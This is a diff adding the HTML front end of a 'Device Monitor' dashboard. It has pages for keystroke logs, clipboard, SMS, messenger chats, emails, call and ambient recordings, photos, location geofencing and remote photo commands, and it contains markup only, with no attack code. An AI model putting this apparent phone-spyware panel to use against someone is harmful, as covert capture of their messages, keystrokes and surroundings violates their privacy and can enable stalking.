@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device Monitor - Stitch Accessible Design</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" integrity="sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY=" crossorigin="">
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" integrity="sha256-20nQCchB9co0qIjJZRGuk2/Z9VM+kNiyxNV1lvTlZBo=" crossorigin=""></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+</head>
+<body>
+    <div class="container">
+        <aside class="sidebar" role="navigation" aria-label="Main navigation">
+            <div class="sidebar-header">
+                <h2>🔍 Device Monitor</h2>
+            </div>
+            <nav class="sidebar-nav">
+                <button class="nav-item active" data-page="dashboard" aria-current="page">Dashboard</button>
+                <button class="nav-item" data-page="map">Location</button>
+                <button class="nav-item" data-page="calls">Call Logs</button>
+                <button class="nav-item" data-page="sms">SMS Messages</button>
+                <button class="nav-item" data-page="messengers">Messengers</button>
+                <button class="nav-item" data-page="web">Web History</button>
+                <button class="nav-item" data-page="apps">App Usage</button>
+                <button class="nav-item" data-page="photos">Photos</button>
+                <button class="nav-item" data-page="screenshots">Screenshots</button>
+                <button class="nav-item" data-page="keystrokes">Keystrokes</button>
+                <button class="nav-item" data-page="clipboard">Clipboard</button>
+                <button class="nav-item" data-page="contacts">Contacts</button>
+        <button class="nav-item" data-page="call-recordings">Call Recordings</button>
+        <button class="nav-item" data-page="emails">Emails</button>
+        <button class="nav-item" data-page="ambient">Ambient Recordings</button>
+                <button class="nav-item" data-page="screen-record">Screen Recordings</button>
+                <button class="nav-item" data-page="risks">Risk Alerts</button>
+                <button class="nav-item" data-page="device">Device Info</button>
+                <button class="nav-item" data-page="network">Network Info</button>
+                <button class="nav-item" data-page="sim">SIM Changes</button>
+            </nav>
+        </aside>
+        <main class="main-content" role="main">
+            <header class="header">
+                <h1 id="page-title">Dashboard</h1>
+                <div class="header-actions">
+                    <button id="refresh-btn" aria-label="Refresh data">🔄 Refresh</button>
+                    <button id="export-csv-btn" aria-label="Export data as CSV">📊 Export CSV</button>
+                    <button id="export-json-btn" aria-label="Export data as JSON">📋 Export JSON</button>
+                </div>
+            </header>
+
+            <div class="filter-bar" aria-label="Filter and search options">
+                <div class="filter-group">
+                    <label for="platform-filter">Platform:</label>
+                    <select id="platform-filter" aria-label="Filter by platform">
+                        <option value="all">All Platforms</option>
+                    </select>
+                </div>
+                <div class="filter-group">
+                    <label for="start-date">From:</label>
+                    <input type="datetime-local" id="start-date" aria-label="Start date filter">
+                </div>
+                <div class="filter-group">
+                    <label for="end-date">To:</label>
+                    <input type="datetime-local" id="end-date" aria-label="End date filter">
+                </div>
+                <div class="filter-group search-group">
+                    <label for="search-input">Search:</label>
+                    <input type="text" id="search-input" placeholder="Search..." aria-label="Search input">
+                </div>
+            </div>
+
+            <div id="alerts-container" class="alerts-container" role="alert" aria-live="polite"></div>
+
+            <!-- Dashboard Page -->
+            <section id="dashboard-page" class="page active" aria-labelledby="page-title">
+                <div class="remote-commands">
+                    <h3>Remote Commands</h3>
+                    <div class="command-buttons">
+                        <button class="command-btn" id="cmd-fetch-location" aria-label="Fetch device location">📍 Fetch Location</button>
+                        <button class="command-btn" id="cmd-take-photo" aria-label="Take remote photo">📷 Take Photo</button>
+                        <button class="command-btn" id="cmd-ring-device" aria-label="Play sound on device">🔊 Play Sound</button>
+                        <button class="command-btn" id="cmd-sync-data" aria-label="Sync device data">🔄 Sync Data</button>
+                    </div>
+                </div>
+                <div class="stats-grid" aria-label="Dashboard statistics">
+                    <div class="stat-card">
+                        <h3>📍 Total Locations</h3>
+                        <p class="stat-value" id="stat-locations">0</p>
+                    </div>
+                    <div class="stat-card">
+                        <h3>📞 Total Calls</h3>
+                        <p class="stat-value" id="stat-calls">0</p>
+                    </div>
+                    <div class="stat-card">
+                        <h3>💬 Total SMS</h3>
+                        <p class="stat-value" id="stat-sms">0</p>
+                    </div>
+                    <div class="stat-card">
+                        <h3>🔋 Battery Level</h3>
+                        <p class="stat-value" id="stat-battery">-</p>
+                    </div>
+                </div>
+                <div class="charts-grid" style="margin-top: 24px;">
+                    <div class="chart-container">
+                        <h3>Top Apps</h3>
+                        <canvas id="apps-chart" aria-label="Top apps usage chart" role="img"></canvas>
+                    </div>
+                </div>
+                <div class="devices-list">
+                    <h2>Recent Activity</h2>
+                    <div id="recent-activity" aria-live="polite"></div>
+                </div>
+            </section>
+
+            <!-- Map Page -->
+            <section id="map-page" class="page" aria-labelledby="page-title">
+                <div class="geofence-section">
+                    <h3>Geofencing</h3>
+                    <div class="geofence-controls">
+                        <input type="text" id="geofence-name" placeholder="Geofence name" aria-label="Geofence name input">
+                        <input type="number" id="geofence-radius" placeholder="Radius (meters)" value="100" aria-label="Geofence radius input">
+                        <button class="command-btn" id="btn-add-geofence" aria-label="Add new geofence">➕ Add Geofence</button>
+                    </div>
+                    <div id="geofences-list" class="geofences-list" aria-live="polite"></div>
+                </div>
+                <div id="map" class="map-container" role="application" aria-label="Device location map"></div>
+            </section>
+
+            <!-- Calls Page -->
+            <section id="calls-page" class="page" aria-labelledby="page-title">
+                <div class="table-container">
+                    <table class="data-table" aria-label="Call logs table">
+                        <thead>
+                            <tr>
+                                <th scope="col">Contact</th>
+                                <th scope="col">Number</th>
+                                <th scope="col">Type</th>
+                                <th scope="col">Duration</th>
+                                <th scope="col">Time</th>
+                            </tr>
+                        </thead>
+                        <tbody id="calls-table"></tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- SMS Page -->
+            <section id="sms-page" class="page" aria-labelledby="page-title">
+                <div class="table-container">
+                    <table class="data-table" aria-label="SMS messages table">
+                        <thead>
+                            <tr>
+                                <th scope="col">Contact</th>
+                                <th scope="col">Number</th>
+                                <th scope="col">Type</th>
+                                <th scope="col">Message</th>
+                                <th scope="col">Time</th>
+                            </tr>
+                        </thead>
+                        <tbody id="sms-table"></tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- Messengers Page -->
+            <section id="messengers-page" class="page" aria-labelledby="page-title">
+                <div class="table-container">
+                    <table class="data-table" aria-label="Messenger messages table">
+                        <thead>
+                            <tr>
+                                <th scope="col">App</th>
+                                <th scope="col">Contact</th>
+                                <th scope="col">Type</th>
+                                <th scope="col">Message</th>
+                                <th scope="col">Time</th>
+                            </tr>
+                        </thead>
+                        <tbody id="messengers-table"></tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- Web History Page -->
+            <section id="web-page" class="page" aria-labelledby="page-title">
+                <div class="table-container">
+                    <table class="data-table" aria-label="Web browsing history table">
+                        <thead>
+                            <tr>
+                                <th scope="col">Title</th>
+                                <th scope="col">URL</th>
+                                <th scope="col">Entry Time</th>
+                                <th scope="col">Exit Time</th>
+                                <th scope="col">Duration</th>
+                                <th scope="col">Browsing Mode</th>
+                                <th scope="col">Recorded At</th>
+                            </tr>
+                        </thead>
+                        <tbody id="web-table"></tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- Apps Page -->
+            <section id="apps-page" class="page" aria-labelledby="page-title">
+                <div class="table-container">
+                    <table class="data-table" aria-label="App usage history table">
+                        <thead>
+                            <tr>
+                                <th scope="col">App</th>
+                                <th scope="col">Package</th>
+                                <th scope="col">Usage Time</th>
+                                <th scope="col">Time</th>
+                            </tr>
+                        </thead>
+                        <tbody id="apps-table"></tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- Photos Page -->
+            <section id="photos-page" class="page" aria-labelledby="page-title">
+                <div class="grid-container" id="photos-grid" aria-label="Device photos gallery"></div>
+            </section>
+
+            <!-- Screenshots Page -->
+            <section id="screenshots-page" class="page" aria-labelledby="page-title">
+                <div class="grid-container" id="screenshots-grid" aria-label="Device screenshots gallery"></div>
+            </section>
+
+            <!-- Keystrokes Page -->
+            <section id="keystrokes-page" class="page" aria-labelledby="page-title">
+                <div class="table-container">
+                    <table class="data-table" aria-label="Keystroke logs table">
+                        <thead>
+                            <tr>
+                                <th scope="col">App</th>
+                                <th scope="col">Text</th>
+                                <th scope="col">Time</th>
+                            </tr>
+                        </thead>
+                        <tbody id="keystrokes-table"></tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- Clipboard Page -->
+            <section id="clipboard-page" class="page" aria-labelledby="page-title">
+                <div class="table-container">
+                    <table class="data-table" aria-label="Clipboard history table">
+                        <thead>
+                            <tr>
+                                <th scope="col">Content</th>
+                                <th scope="col">Time</th>
+                            </tr>
+                        </thead>
+                        <tbody id="clipboard-table"></tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- Contacts Page -->
+            <section id="contacts-page" class="page" aria-labelledby="page-title">
+                <div class="table-container">
+                    <table class="data-table" aria-label="Contacts history table">
+                        <thead>
+                            <tr>
+                                <th scope="col">Name</th>
+                                <th scope="col">Phone Numbers</th>
+                                <th scope="col">Emails</th>
+                                <th scope="col">Time</th>
+                            </tr>
+                        </thead>
+                        <tbody id="contacts-table"></tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- Call Recordings Page -->
+            <section id="call-recordings-page" class="page" aria-labelledby="page-title">
+                <div class="table-container">
+                    <table class="data-table" aria-label="Call recordings table">
+                        <thead>
+                            <tr>
+                                <th scope="col">Contact</th>
+                                <th scope="col">Phone Number</th>
+                                <th scope="col">Call Type</th>
+                                <th scope="col">Duration</th>
+                                <th scope="col">File</th>
+                                <th scope="col">Time</th>
+                            </tr>
+                        </thead>
+                        <tbody id="call-recordings-table"></tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- Emails Page -->
+            <section id="emails-page" class="page" aria-labelledby="page-title">
+                <div class="table-container">
+                    <table class="data-table" aria-label="Emails table">
+                        <thead>
+                            <tr>
+                                <th scope="col">From</th>
+                                <th scope="col">To</th>
+                                <th scope="col">Subject</th>
+                                <th scope="col">Body</th>
+                                <th scope="col">Time</th>
+                            </tr>
+                        </thead>
+                        <tbody id="emails-table"></tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- Ambient Recordings Page -->
+            <section id="ambient-page" class="page" aria-labelledby="page-title">
+                <div class="table-container">
+                    <table class="data-table" aria-label="Ambient recordings history table">
+                        <thead>
+                            <tr>
+                                <th scope="col">File</th>
+                                <th scope="col">Duration</th>
+                                <th scope="col">Recorded At</th>
+                            </tr>
+                        </thead>
+                        <tbody id="ambient-table"></tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- Screen Recordings Page -->
+            <section id="screen-record-page" class="page" aria-labelledby="page-title">
+                <div class="table-container">
+                    <table class="data-table" aria-label="Screen recordings history table">
+                        <thead>
+                            <tr>
+                                <th scope="col">File</th>
+                                <th scope="col">Duration</th>
+                                <th scope="col">Recorded At</th>
+                            </tr>
+                        </thead>
+                        <tbody id="screen-record-table"></tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- Risk Alerts Page -->
+            <section id="risks-page" class="page" aria-labelledby="page-title">
+                <div class="table-container">
+                    <table class="data-table" aria-label="Risk alerts table">
+                        <thead>
+                            <tr>
+                                <th scope="col">Alert Type</th>
+                                <th scope="col">Description</th>
+                                <th scope="col">Source</th>
+                                <th scope="col">Content</th>
+                                <th scope="col">Time</th>
+                            </tr>
+                        </thead>
+                        <tbody id="risks-table"></tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- Device Info Page -->
+            <section id="device-page" class="page" aria-labelledby="page-title">
+                <div class="device-info-container">
+                    <div class="info-card" id="device-info-card" aria-label="Device information"></div>
+                </div>
+            </section>
+
+            <!-- Network Info Page -->
+            <section id="network-page" class="page" aria-labelledby="page-title">
+                <div class="table-container">
+                    <table class="data-table" aria-label="Network information history table">
+                        <thead>
+                            <tr>
+                                <th scope="col">Wi-Fi SSID</th>
+                                <th scope="col">Network Type</th>
+                                <th scope="col">Signal Strength</th>
+                                <th scope="col">Time</th>
+                            </tr>
+                        </thead>
+                        <tbody id="network-table"></tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- SIM Changes Page -->
+            <section id="sim-page" class="page" aria-labelledby="page-title">
+                <div class="table-container">
+                    <table class="data-table" aria-label="SIM change history table">
+                        <thead>
+                            <tr>
+                                <th scope="col">Old IMSI</th>
+                                <th scope="col">New IMSI</th>
+                                <th scope="col">Time</th>
+                            </tr>
+                        </thead>
+                        <tbody id="sim-table"></tbody>
+                    </table>
+                </div>
+            </section>
+        </main>
+    </div>
+
+    <script src="app.js"></script>
+</body>
+</html>
